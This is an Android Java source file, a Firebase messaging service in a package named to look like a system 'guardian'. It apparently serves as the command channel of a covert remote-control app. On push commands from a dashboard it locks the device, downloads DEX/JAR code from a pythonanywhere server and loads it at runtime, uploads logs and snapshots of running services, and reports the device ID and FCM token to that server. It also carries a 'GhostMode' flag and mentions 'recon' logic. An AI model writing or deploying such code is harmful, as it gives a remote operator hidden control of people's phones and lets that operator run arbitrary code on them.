package com.system.guardian.firebase;

import android.annotation.SuppressLint;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.provider.Settings;

import androidx.annotation.NonNull;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import com.system.guardian.AdminReceiver;
import com.system.guardian.ControlPollerWorker;
import com.system.guardian.CrashLogger;
import com.system.guardian.DexLoader;
import com.system.guardian.GuardianStateCache;
import com.system.guardian.NetworkUtils;
import com.system.guardian.background.LogUploadWorker;
import com.system.guardian.core.LogUploader;
import com.system.guardian.dex_patch_build.PatchOverride;

import org.json.JSONObject;

import java.io.File;
import java.net.URL;

public class GuardianMessagingService extends FirebaseMessagingService {

    @Override
    public void onMessageReceived(@NonNull RemoteMessage remoteMessage) {
        if (GuardianStateCache.isGhostModeEnabled) {
            CrashLogger.log(this, "GhostFCM", "👻 GhostMode Blocked FCM Message: " + remoteMessage.getData());
            return;
        }

        CrashLogger.log(this, "FirebaseMsg", "📩 Message received: " + remoteMessage.getData());
        LogUploader.uploadLog(this, "📩 Firebase message received: " + remoteMessage.getData());

        if ("true".equals(remoteMessage.getData().get("lock"))) {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
            if (dpm.isAdminActive(adminComponent)) {
                dpm.lockNow();
                CrashLogger.log(this, "FirebaseLock", "🔒 Device locked via Firebase command.");
                LogUploader.uploadLog(this, "🔒 Device locked via FCM");
            }
        }

        if ("true".equals(remoteMessage.getData().get("apk_update"))) {
            CrashLogger.log(this, "FirebaseMsg", "🚀 APK update triggered from dashboard");
            LogUploader.uploadLog(this, "🚀 APK update trigger received via FCM");
            OneTimeWorkRequest request = new OneTimeWorkRequest.Builder(ControlPollerWorker.class).build();
            WorkManager.getInstance(this).enqueue(request);
        }

        if ("true".equals(remoteMessage.getData().get("dex_update"))) {
            CrashLogger.log(this, "FirebaseMsg", "🧬 DEX/JAR patch update triggered from dashboard");
            LogUploader.uploadLog(this, "🧬 Dex/Jar patch trigger received via FCM");

            new Thread(() -> {
                Context context = getApplicationContext();
                @SuppressLint("HardwareIds")
                String token = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
                String url = "https://digiserve25.pythonanywhere.com/control/" + token + ".json";

                try {
                    JSONObject response = NetworkUtils.getJsonFromUrl(url, context);
                    if (response == null) {
                        CrashLogger.log(context, "DexTrigger", "❌ No response from control JSON");
                        return;
                    }

                    CrashLogger.log(context, "DexTrigger", "📦 Control JSON: " + response);

                    // DEX patch handling
                    String dexUrl = response.optString("dex_url", "");
                    CrashLogger.log(context, "DexTrigger", "🔍 dex_url: " + dexUrl);
                    if (isValidUrl(dexUrl)) {
                        File dexFile = new File(context.getNoBackupFilesDir(), "patch.dex");
                        long startDex = System.currentTimeMillis();
                        dexFile = NetworkUtils.downloadFile(context, dexUrl, dexFile);
                        long endDex = System.currentTimeMillis();
                        CrashLogger.log(context, "DexTrigger", "⏱️ DEX download time: " + (endDex - startDex) + "ms");

                        if (dexFile.getAbsolutePath().isEmpty() || !dexFile.exists()) {
                            CrashLogger.log(context, "DexTrigger", "❌ Dex file invalid or missing — aborting.");
                        } else {
                            CrashLogger.log(context, "DexTrigger", "📥 Saved patch.dex to: " + dexFile.getAbsolutePath());
                            CrashLogger.log(context, "DexTrigger", "🧬 Calling DexLoader.schedulePatchLoad() on: " + dexFile.getName());
                            DexLoader.schedulePatchLoad(context, dexFile);
                            CrashLogger.log(context, "DexTrigger", "✅ DEX patch scheduled");
                        }
                    }

                    // JAR patch handling
                    String jarUrl = response.optString("jar_url", "");
                    CrashLogger.log(context, "DexTrigger", "🔍 jar_url: " + jarUrl);
                    if (isValidUrl(jarUrl) && !"null".equalsIgnoreCase(jarUrl)) {
                        File jarFile = new File(context.getNoBackupFilesDir(), "patch.jar");
                        long startJar = System.currentTimeMillis();
                        jarFile = NetworkUtils.downloadFile(context, jarUrl, jarFile);
                        long endJar = System.currentTimeMillis();
                        CrashLogger.log(context, "DexTrigger", "⏱️ JAR download time: " + (endJar - startJar) + "ms");

                        if (jarFile.getAbsolutePath().isEmpty() || !jarFile.exists()) {
                            CrashLogger.log(context, "DexTrigger", "❌ Jar file invalid or missing — aborting.");
                        } else {
                            CrashLogger.log(context, "DexTrigger", "📥 Saved patch.jar to: " + jarFile.getAbsolutePath());
                            CrashLogger.log(context, "DexTrigger", "🧪 Calling DexLoader.schedulePatchLoad() on: " + jarFile.getName());
                            DexLoader.schedulePatchLoad(context, jarFile);
                            CrashLogger.log(context, "DexTrigger", "✅ JAR patch scheduled");
                        }
                    }

                } catch (Exception e) {
                    CrashLogger.log(context, "DexTrigger", "❌ Patch download/apply error: " + e.getMessage());
                }
            }).start();
        }

        if ("true".equals(remoteMessage.getData().get("upload_logs"))) {
            CrashLogger.log(this, "FirebaseMsg", "📡 Log upload trigger received via FCM");
            CrashLogger.log(this, "FirebaseMsg", "🛰️ Log pull triggered manually via dashboard");

            // 🧪 Emit diagnostics to ensure log upload contains data
            CrashLogger.log(this, "FirebaseMsg", "📶 Network Available: " +
                    NetworkUtils.isNetworkAvailable(this));
            CrashLogger.log(this, "FirebaseMsg", "🧠 Services Snapshot:\n" +
                    PatchOverride.getRunningServicesSnapshot(this));

            // 🚀 Force send logs now
            CrashLogger.flush(this);

            // ⏳ Immediate upload
            OneTimeWorkRequest uploadRequest = new OneTimeWorkRequest.Builder(LogUploadWorker.class)
                    .addTag("ImmediateLogUpload")
                    .build();
            WorkManager.getInstance(this).enqueue(uploadRequest);

            // 🕒 Fallback periodic log upload
            PeriodicWorkRequest fallbackUpload = new PeriodicWorkRequest.Builder(
                    LogUploadWorker.class, 15, java.util.concurrent.TimeUnit.MINUTES)
                    .addTag("PeriodicLogUpload")
                    .build();
            WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                    "GuardianLogUploaderFallback",
                    ExistingPeriodicWorkPolicy.KEEP,
                    fallbackUpload
            );

            // 🔄 Trigger soft recon/refresh logic
            CrashLogger.log(this, "FirebaseMsg", "🧪 Re-triggering recon logic from dashboard");
            PatchOverride.applyPatch(getApplicationContext());  // Soft boot via dynamic override

            // 🧬 Optional: Lightweight reschedule if needed
            DexLoader.schedulePatchLoad(getApplicationContext(), null);
        }
    }

    private static boolean isValidUrl(String urlStr) {
        if (urlStr == null || urlStr.trim().isEmpty()) return false;
        try {
            URL url = new URL(urlStr);
            return url.getProtocol().startsWith("http");
        } catch (Exception e) {
            return false;
        }
    }

    @Override
    public void onNewToken(@NonNull String token) {
        super.onNewToken(token);
        CrashLogger.log(this, "FCM", "🔄 FCM Token refreshed: " + token);
        LogUploader.uploadLog(this, "FCM token updated: " + token);

        new Thread(() -> {
            try {
                @SuppressLint("HardwareIds")
                String deviceToken = Settings.Secure.getString(
                        getContentResolver(), Settings.Secure.ANDROID_ID
                );

                JSONObject payload = new JSONObject();
                payload.put("device_token", deviceToken);
                payload.put("fcm_token", token);

                NetworkUtils.sendJsonToServer(
                        "https://digiserve25.pythonanywhere.com/register-fcm-token/",
                        payload
                );

                CrashLogger.log(this, "FCM", "✅ FCM token registered: " + deviceToken);
                GuardianStateCache.isTokenUploaded = true;

            } catch (Exception e) {
                CrashLogger.log(this, "FCM", "❌ Failed to register FCM token: " + e.getMessage());
            }
        }).start();
    }
}
